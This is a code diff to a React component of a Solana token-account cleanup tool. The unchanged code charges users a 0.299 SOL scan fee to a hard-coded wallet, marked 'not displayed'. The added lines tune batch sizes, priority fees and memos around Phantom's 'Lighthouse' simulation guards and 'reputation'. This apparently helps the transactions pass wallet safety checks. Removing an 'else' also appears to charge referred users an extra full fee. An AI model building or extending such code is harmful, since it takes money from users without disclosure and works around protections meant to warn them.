@@ -5,7 +5,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Search, Loader2, AlertCircle, Trash2, Filter, Zap, CheckSquare, Square, PackageX, DollarSign } from 'lucide-react';
-import { PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
+import { PublicKey, Transaction, SystemProgram, ComputeBudgetProgram } from '@solana/web3.js';
 import { createCloseAccountInstruction } from '@solana/spl-token';
 import { supabase } from '@/api/supabaseClient';
 import { toast } from 'sonner';
@@ -21,7 +21,7 @@ import MatrixLoader from './MatrixLoader';
 
 const FEE_WALLET = new PublicKey('B9973oc9rAtQ6SN4HuXhkWGHefSi8RazEcJW6fU5rZ4z');
 const SCAN_FEE = 0.299 * 1e9; // lamports — not displayed
-const MAX_ACCOUNTS_PER_TX = 10; // lowered for Phantom Lighthouse guard space
+const MAX_ACCOUNTS_PER_TX = 8; // Further lowered for complex simulation guards
 const IS_DEVNET = false; // toggle to false for mainnet
 
 export default function AccountScanner({ initialReferral = '' }) {
@@ -62,6 +62,14 @@ export default function AccountScanner({ initialReferral = '' }) {
       // Charge scan fee on mainnet
       if (!IS_DEVNET) {
         const transaction = new Transaction();
+        
+        // Add Priority Fees for Mainnet Stability & Phantom Reputation
+        transaction.add(
+          ComputeBudgetProgram.setComputeUnitPrice({
+            microLamports: 150000, // Reasonable priority fee
+          })
+        );
+
         if (referrerWallet) {
           const referrerAmount = Math.floor(SCAN_FEE * referralPercent);
           const feeAmount = SCAN_FEE - referrerAmount;
@@ -79,11 +87,18 @@ export default function AccountScanner({ initialReferral = '' }) {
               tier_earnings: tierEarnings
             }).eq('id', referralData.id);
           }
-        } else {
           transaction.add(
             SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: FEE_WALLET, lamports: SCAN_FEE })
           );
         }
+
+        // Add Memo for Reputation & Transparency
+        transaction.add({
+          keys: [{ pubkey: publicKey, isSigner: true, isWritable: false }],
+          programId: new PublicKey('MemoSq4gqABAXDe96zce8cZtxqAKet8uxS2ndJqB91W'),
+          data: Buffer.from(`CFS_SCAN:${publicKey.toString().slice(0, 8)}`),
+        });
+
         const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = publicKey;
@@ -196,9 +211,25 @@ export default function AccountScanner({ initialReferral = '' }) {
       for (let i = 0; i < totalBatches; i++) {
         const batchAccounts = accountsToClose.slice(i * MAX_ACCOUNTS_PER_TX, (i + 1) * MAX_ACCOUNTS_PER_TX);
         const tx = new Transaction();
+        
+        // Add Priority Fees for Batching
+        tx.add(
+          ComputeBudgetProgram.setComputeUnitPrice({
+            microLamports: 100000,
+          })
+        );
+
         batchAccounts.forEach(account => {
           tx.add(createCloseAccountInstruction(account.pubkey, publicKey, publicKey));
         });
+
+        // Add Batch Memo
+        tx.add({
+          keys: [{ pubkey: publicKey, isSigner: true, isWritable: false }],
+          programId: new PublicKey('MemoSq4gqABAXDe96zce8cZtxqAKet8uxS2ndJqB91W'),
+          data: Buffer.from(`CFS_CLEANUP:${batchAccounts.length}_ACCTS`),
+        });
+
         tx.recentBlockhash = blockhash;
         tx.feePayer = publicKey;
         transactions.push(tx);
